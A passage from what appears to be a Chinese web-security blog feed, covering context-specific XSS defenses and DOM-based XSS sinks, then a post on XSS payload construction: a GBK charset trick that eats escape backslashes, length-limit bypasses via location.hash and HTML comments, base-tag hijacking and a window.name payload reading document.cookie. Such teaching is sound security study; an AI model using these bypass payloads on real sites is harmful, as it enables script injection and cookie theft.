class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>使用 <code>&quot;</code> 闭合属性引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>HtmlEncode。</p></li></ul><h2 id="在script标签中输出"><a href="#在script标签中输出" class="headerlink" title="在script标签中输出"></a>在script标签中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>使用 <code>&quot;</code> 闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>JavascriptEncode</p></li></ul><h2 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>JavascriptEncode</p></li></ul><h2 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h2><ul><li><p><strong>例子与利用方式</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 通过@import指令从恶意URL导入一个CSS文件</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"># 从指定的URL加载绑定文件，该文件可以包含恶意的XBL</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;-moz-binding:<span class="built_in">url</span>(<span class="string">&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"># behavior属性用于将特定的行为（通常是HTC文件，一种微软专有的HTML组件）附加到页面元素。</span><br><span class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span></span><br><span class="line"># 利用CSS中的list-style-image属性，插入JavaScript代码，该代码在渲染列表项图像时执行。</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS</span><br><span class="line"># 通过background-image属性插入JavaScript代码。</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"># expression是一个允许CSS属性值为JavaScript表达式的特性。这可以用来执行JavaScript代码。</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>尽可能地禁止用户控制的变量在<code>&lt;style&gt;</code>标签、HTML标签的style属性以及CSS文件中输出。</p><p>可以使用encodeForCSS()函数</p></li></ul><h2 id="在地址中输出"><a href="#在地址中输出" class="headerlink" title="在地址中输出"></a>在地址中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=$var&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>一个url的组成一般如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Protocal][Host][Path][Search][Hash]</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/a/b/c/test?abc=123#sss</span><br><span class="line">[Protocal]=&quot;https://&quot;</span><br><span class="line">[Host]=&quot;www.a.com&quot;</span><br><span class="line">[Path]=&quot;/a/b/c/test&quot;</span><br><span class="line">[Search]=&quot;?abc=123&quot;</span><br><span class="line">[Hash]=&quot;#ssss&quot;</span><br></pre></td></tr></table></figure><p>攻击者可能会构造伪协议实施攻击，包括javascript、vbscript、dataURI等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><ul><li><p><strong>检查URL的协议</strong>：确保URL以“http”或“https”开头，如果不是，则自动添加。</p></li><li><p><strong>URLEncode路径和参数</strong>：在确保协议和主机部分正确后，再对路径和参数部分进行URLEncode。</p><blockquote><p>在用户能够完全控制URL的情况下，Protocal和Host部分不能使用URLEncode，否则会改变URL的语义。</p></blockquote></li></ul></li></ul><h1 id="富文本处理"><a href="#富文本处理" class="headerlink" title="富文本处理"></a>富文本处理</h1><p>什么是富文本：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。</span><br><span class="line">比如一个用户在论坛里发帖，帖子的内容里要有图片、视频，表格等，</span><br><span class="line">这些“富文本”的效果都需要通过HTML代码来实现。</span><br></pre></td></tr></table></figure><p>如何处理富文本：</p><ul><li>通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</li><li>禁止事件</li><li>标签的选择：使用白名单，只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较“安全”的标签存在。</li><li>自定义CSS：尽量禁止</li></ul><h1 id="DOM-Based-XSS-防御"><a href="#DOM-Based-XSS-防御" class="headerlink" title="DOM Based XSS 防御"></a>DOM Based XSS 防御</h1><p>前文提到的方法都是针对 “<strong>从服务器应用直接输出到HTML页面</strong>” 的XSS漏洞，并不适用于DOM Based XSS。</p><blockquote><p>DOM Based XSS漏洞发生在客户端，<strong>浏览器</strong>在解析和执行JavaScript代码时引入了恶意脚本。</p></blockquote><ul><li><p><strong>例子1</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//将 div 元素 (id=&quot;t&quot;) 的内部 HTML 设置为一个带有 str 作为链接地址的 &lt;a&gt; 元素。链接的文本显示为 testLink。</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;t&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;write&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在button的onclick事件中，执行了test()函数，而该函数将text标签的输入值写入了DOM节点，最后导致了XSS的发生。</p></li><li><p><strong>例子2</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//code1 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;&gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>变量 <code>$var</code> 被写入html页面中，可能产生xss攻击。</p><p>假设用户输入 <code>$var</code> 的值为<code>onclick=alert(1);//</code>，这个值被发送给了服务器端，服务器对其进行了 <code>javascriptEscape</code> 转义处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//code2</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x=<span class="string">&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">write</span>&#123;<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;&gt;test&lt;/a&gt;&quot;</span>&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转义后的值被嵌入到HTML模板中，并传递到客户端浏览器。</p><p>但是，这个转义是在服务器端完成的，目的是防止直接在服务器端生成的HTML中执行恶意代码。然而，转义后的字符串被传递到客户端后，浏览器会重新解析这些转义字符，使其恢复原始的恶意代码。</p><p>当浏览器解析并执行这段JavaScript代码的时候，浏览器重新渲染页面，转义后的结果在 <code>document.write</code> 执行时，浏览器会将转义字符还原为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;&#x27; onclick=alert(1);//&#x27;&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>点击 <code>test</code> 链接会触发 <code>onclick</code> 事件，成功注入XSS。</p><blockquote><p><strong>为什么会出现这样的转义无效现象？？</strong></p><p>首先，客户端对x的转义在javascript中生效了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x=&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;;(1)</span><br></pre></td></tr></table></figure><p>当这段代码执行的时候，<strong>JavaScript解释器将这些转义字符解析为对应的实际字符</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x = &quot; &#x27;onclick=alert(1);//&#x27; &quot;;(2)</span><br></pre></td></tr></table></figure><p>注意，这里因为转义的存在，这段javascript代码中将x的内容<code>&#39;onclick=alert(1);//&#39; </code>视作了字符串，并不会对其进行执行</p><p>但是后续document.write执行的时候，会将 <code>x</code> 的内容（已经完成解析，即为上面（2）中的内容）插入到HTML中，而这段<strong>在html上插入时没有进行再转义</strong>，产生了xss漏洞。</p></blockquote></li><li><p><strong>防御方法</strong></p><p><strong>JS输出到HTML页面，也相当于一次XSS输出过程。需要分语境使用不同的编码函数。</strong></p><ul><li><p>首先，当”$var”输出到<code>&lt;script&gt;</code>时，应该执行一次javascriptEncode</p><blockquote><p>这一步是在将用户输入赋值给 JavaScript 变量时进行的编码，确保输入不会被解释为 JavaScript 代码。</p><p>在服务器端和客户端都可以进行编码</p></blockquote></li><li><p>其次，document.write输出到HTML，要分2种情况</p><ul><li>如果document.write输出到事件或者脚本，再做一次javascriptEncode</li><li>如果document.write输出到HTML内容或者属性，则做一次HtmlEncode</li></ul></li></ul></li><li><p><strong>DOM based XSS的触发点</strong></p><ul><li><p>JS输出到HTML页面</p><p>需要重点关注这几个地方的参数是否可以被用户控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">xxx.innerHTML=</span><br><span class="line">xxx.outerHTML=</span><br><span class="line">innerHTML.replace</span><br><span class="line">document.attachEvent()</span><br><span class="line">window.attachEvent()</span><br><span class="line">document.location.replace()</span><br><span class="line">document.location.assign()</span><br></pre></td></tr></table></figure></li><li><p>其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">页面中所有的inputs框</span><br><span class="line">window.location(href、hash等)</span><br><span class="line">window.name</span><br><span class="line">document.referrer</span><br><span class="line">document.cookie</span><br><span class="line">localstorage</span><br><span class="line">XMLHttpRequest返回的数据</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨站脚本攻击 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS构造技巧</title>
      <link href="/posts/6df.html"/>
      <url>/posts/6df.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍如何进行构造XSS</p><h1 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h1><ol><li><p><strong>应用场景</strong></p><p>网站对用户的输入中的双引号等特殊符号进行了转义</p></li><li><p><strong>方法</strong></p><p>构造字符编码吃掉转义符号</p></li><li><p><strong>例子</strong></p><p>网站在一个 <code>&lt;script&gt;</code> 标签里面输出了一个用户输入的变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot; &quot;</span>;</span><br></pre></td></tr></table></figure><p>如果我们输入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(/XSS/);</span><br></pre></td></tr></table></figure><p>因为双引号被转义，所以在html页面上的输出如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot;\&quot;;alert(/XSS/);&quot;</span>;</span><br></pre></td></tr></table></figure><p>并不能执行后面的XSS代码</p><blockquote><p>javascript中的转义字符是 <code>\</code>，会将特殊符号如单引号、双引号等构造成 <code>\&#39;</code>, <code>\&quot;</code> 的形式。</p><p>在这里的话 <code>\&quot;</code> 就直接被视作文本的 <code>&quot;</code> 了，而并不会和前面的前引号 <code>&quot;</code> 形成闭合。</p></blockquote><p>但是，百度的返回页面是 <code>GBK/GB2312</code> 编码的，因此 <code>%c1\</code>  这两个字符组合在一起后，会成为一个Unicode字符。在firefox浏览器中会认为这是一个字符，所以构造xss攻击代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1<span class="string">&quot;;alert(/XSS/);//</span></span><br></pre></td></tr></table></figure><p>在页面上，引号 <code>%c1&quot;</code> 被转义成 <code>%c1\&quot;</code> ，而 <code>%c1\</code> 组成了一个新的Unicode字符，吃掉了转义符号 <code>\</code>，从而让构造的 <code>&quot;</code> 和前面的前引号形成闭合绕过了系统的安全检查，成功实施了XSS注入。</p></li></ol><h1 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h1><ol><li><p><strong>应用场景</strong></p><p>有时候服务器端可能对输入变量的长度进行了限制，长度限制不足以构造XSS</p></li><li><p><strong>方法</strong></p><p>1）<strong>使用event</strong></p><ul><li>onclick</li></ul><p>2）<strong>将payload写到别处，通过简短的代码加载这段XSS payload</strong></p><ul><li><p>loaction.hash</p><p><code>location.hash</code> 是 JavaScript 中 <code>location</code> 对象的一个属性，它返回 URL 中的哈希&#x2F;锚部分（即 <code>#</code> 号及其后面的部分）。</p><blockquote><p><code>location.hash</code> 对象的具体解释：<a link = https://blog.csdn.net/Garrettzxd/article/details/80671034> location.hash详解</a></p></blockquote><p>因为哈希部分不会被发送到服务器，所以服务器端的Web日志中并不会记录下location.hash 里的内容，从而也更好地隐藏了黑客真实的意图。</p><p><code>location.hash</code> 没有长度限制，所以可以将XSS代码写在<code>location.hash</code> 部分，然后在页面中限制长度的地方构造代码执行<code>location.hash</code> </p></li><li><p>远程加载js文件</p></li><li><p><strong>利用注释符</strong></p></li></ul></li><li><p><strong>例子</strong></p><p><strong>1）onclick</strong></p><p>构造文本框内输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(1)//</span> &quot;/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.1）loaction.hash</strong></p><p>构造url为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.html#alert(1)</span><br></pre></td></tr></table></figure><p>这里的 <code>#alert(1)</code> 就是<code>location.hash</code></p><p>构造网页中的文本输入框为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;eval(location.hash.substr(1)) &quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eval（）函数：</p><ul><li>如果参数是一个表达式，eval() 函数将执行表达式。</li><li>如果参数是 Javascript 语句，eval() 将执行 Javascript 语句。</li></ul></blockquote><p>当我们点击这个文本框的时候，会执行 <code>location.hash</code> 中的代码，并去掉哈希部分的第一个字符（<code>#</code>）</p><p>因此，当用户点击这个输入框时， <code>location.hash</code>为 <code>#alert(1)</code>，去掉第一个字符后，<code>eval</code> 函数将执行 <code>alert(1)</code>，从而弹出一个警告框。</p><p>这样就成功执行了我们构造的XSS攻击代码。</p><p><strong>2.3）利用注释符</strong></p><p>网站上存在两个文本框，第一个文本框存在长度限制，第二个文本框允许写入更多的字节。</p><p>此时可以利用HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个<code>&lt;input&gt;</code> 标签。</p><p>例，有2个文本框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">xxxxxxxxxxxxx</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">2</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在第一个input文本框中，输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&quot;</span><span class="keyword">var</span> a=<span class="string">&#x27;This is a long &#x27;</span>;<span class="string">&quot;&gt;&lt;!--</span></span><br></pre></td></tr></table></figure><blockquote><p><code>onfocus</code> 事件是一个 JavaScript 事件，它在元素获得焦点时触发。焦点是指用户通过点击、触摸或使用键盘（如 Tab 键）将输入光标或选中状态移动到某个元素上。</p><p>在 HTML 中，<code>onfocus</code> 事件可以直接在元素标签内部指定</p></blockquote><p>在第二个input文本框中，输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(a + <span class="string">&#x27;XSS attack!&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>最终生成的html代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">&quot;input1&quot;</span> type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> onfocus=<span class="string">&quot;var a=&#x27;This is a long &#x27;;&quot;</span>&gt;&lt;!--<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;!-- Some HTML content or other inputs --&gt;</span></span><br><span class="line"><span class="string">&lt;input id=&quot;</span>input2<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; value=&quot;</span>--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(a + <span class="string">&#x27;XSS attack!&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="string">&quot; /&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，当第一个文本框获得焦点时，会执行 <code>onfocus</code> 事件中的JavaScript代码，定义了一个变量 <code>a</code>。由于第一个文本框的值以 <code>&quot;&gt;&lt;!--</code> 结尾，它实际上将中间的HTML内容注释掉了，直到遇到第二个文本框中的 <code>--&gt;</code>，这结束了注释。然后，第二个文本框中的 <code>&lt;script&gt;</code> 标签被正确解析并执行，弹出带有完整消息的警告框。</p><p>通过这种方式，我们成功地将较长的攻击代码分割成两个部分，并利用HTML注释符将它们连接起来，绕过了单个输入字段的长度限制。</p></li></ol><h1 id="使用base标签"><a href="#使用base标签" class="headerlink" title="使用base标签"></a>使用base标签</h1><p><code>&lt;base&gt;</code> 标签的作用是定义页面上的所有使用“相对路径”标签的hosting地址，可以作用于该标签之后的所有标签。</p><p>例如：</p><p>这样访问的img路径就是 <code>http://www.google.com/intl/en_ALL/images/srpr/logo1w.png</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.google.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/intl/en_ALL/images/srpr/logo1w.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者如果在页面中插入了 <code>&lt;base&gt;</code> 标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。</p><p>因此需要对这个标签进行过滤。</p><h1 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h1><p>对当前窗口的<code>window.name</code> 对象赋值，没有特殊字符的限制。</p><p>因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。黑客利用这个对象，可以实现跨域、跨页面传递数据。</p><p>使用window.name 可以缩短XSS Payload的长度，如下所示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.name = &quot;alert(document.cookie)&quot;;</span><br><span class="line">locaton.href = &quot;http://www.xssedsite.com/xssed.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在同一窗口打开存在XSS的站点后，只需通过XSS执行name中的代码即可：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(name);</span><br></pre></td></tr></table></figure><p>只有11个字节，短到了极点。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨站脚本攻击 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe007 逆向分析</title>
      <link href="/posts/7dac.html"/>
